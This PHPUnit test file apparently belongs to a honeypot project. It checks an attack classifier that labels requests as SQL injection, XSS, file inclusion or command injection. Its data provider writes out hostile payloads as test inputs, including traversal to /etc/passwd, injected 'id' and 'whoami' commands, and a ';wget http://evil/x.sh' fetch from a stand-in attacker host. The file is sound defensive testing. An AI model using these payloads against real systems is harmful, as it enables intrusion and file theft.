<?php

declare(strict_types=1);

namespace Funnypot\Tests\App;

use Funnypot\App\ThreatIntel\AttackClassifier;
use Funnypot\Core\RequestContext;
use PHPUnit\Framework\TestCase;

/**
 * The fall-through attack classifier: high-precision, so a strong payload is labelled and a benign
 * request is left alone (a false positive would mislabel a hit and report an innocent IP).
 */
final class AttackClassifierTest extends TestCase
{
    private AttackClassifier $c;

    protected function setUp(): void
    {
        $this->c = new AttackClassifier();
    }

    /**
     * @dataProvider payloads
     */
    public function test_classifies_attack_payloads(string $label, string $query, ?string $expected): void
    {
        self::assertSame($expected, $this->c->classify(new RequestContext('GET', '/x', $query)), $label);
    }

    /** @return array<int,array{0:string,1:string,2:?string}> */
    public static function payloads(): array
    {
        return [
            ['sqli union', "id=1 UNION SELECT user,pass FROM users", 'sqli'],
            ['sqli or 1=1', "id=1 or 1=1", 'sqli'],
            ['sqli sleep', "id=1;sleep(5)", 'sqli'],
            ['sqli info_schema', "q=information_schema.tables", 'sqli'],
            ['xss script', 'q=<script>alert(1)</script>', 'xss'],
            ['xss handler', 'name=<img src=x onerror=alert(1)>', 'xss'],
            ['lfi passwd', 'file=../../../../etc/passwd', 'lfi'],
            ['lfi encoded', 'file=%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'lfi'],
            ['lfi double-encoded', 'file=%252e%252e%252f%252e%252e%252fetc%252fpasswd', 'lfi'],
            ['sqli double-encoded', 'id=1%2520UNION%2520SELECT%2520a%2520FROM%2520users', 'sqli'],
            ['lfi php filter', 'p=php://filter/convert.base64-encode/resource=index', 'lfi'],
            ['rce semicolon', 'host=127.0.0.1;id', 'rce'],
            ['rce pipe', 'x=1|whoami', 'rce'],
            ['rce subshell', 'x=$(id)', 'rce'],
            ['rce wget', 'u=;wget http://evil/x.sh', 'rce'],
            ['benign path', '', null],
            ['benign query', 'page=2&sort=name', null],
            ['benign search', 'q=quarterly sales report 2026', null],
            ['benign single dotdot', 'path=../images/logo.png', null],
            ['benign double-encoded text', 'name=%2547%2543', null],
        ];
    }

    public function test_matches_body_and_path_too(): void
    {
        // The surface is path + query + body, so a payload anywhere is caught.
        $viaBody = new RequestContext('POST', '/login', '', [], "user=admin' UNION SELECT 1--");
        self::assertSame('sqli', $this->c->classify($viaBody));
        $viaPath = new RequestContext('GET', '/index.php?x=../../../../etc/passwd', '');
        self::assertSame('lfi', $this->c->classify($viaPath));
    }

    public function test_severity_per_class(): void
    {
        self::assertSame('critical', AttackClassifier::severityFor('rce'));
        self::assertSame('high', AttackClassifier::severityFor('sqli'));
        self::assertSame('high', AttackClassifier::severityFor('lfi'));
        self::assertSame('medium', AttackClassifier::severityFor('xss'));
    }
}
